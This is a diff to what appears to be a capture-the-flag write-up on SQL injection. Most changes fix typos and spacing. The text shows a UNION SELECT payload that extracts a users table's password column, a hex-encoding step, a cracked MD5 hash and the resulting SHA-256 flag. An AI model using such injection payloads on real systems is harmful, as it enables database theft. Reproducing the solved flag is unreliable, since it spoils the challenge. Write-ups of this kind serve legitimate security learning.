@@ -19,14 +19,16 @@ commands:
 1 UNION SELECT first_name, countersign FROM users
 ```
 
-get teh hex for users on the terminal:
+get the hex for users on the terminal:
+
 ```bash
 echo -n "users" | xxd -p
 ```
+
 Surname : Decrypt this password -> then lower all the char. Sh256 on it and it's good !
 Found MD5 hash: `5ff9d0165b4f92b14994e5c685cdce28` → cracks to `FortyTwo`
 
-```bash 
+```bash
 echo -n "fortytwo" | shasum -a 256
 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5  
 ```
@@ -61,6 +63,7 @@ Try to enter the following:
 Imagine the database has a table called `users`. Based on our outputs, it looks like this internally:
 
 **Table: `users**`
+
 | user_id | first_name | last_name | town | ... | Commentaire | **countersign** |
 | :--- | :--- | :--- | :--- | :--- | :--- | :--- |
 | 1 | one | me | Paris | ... | (empty) | (empty) |
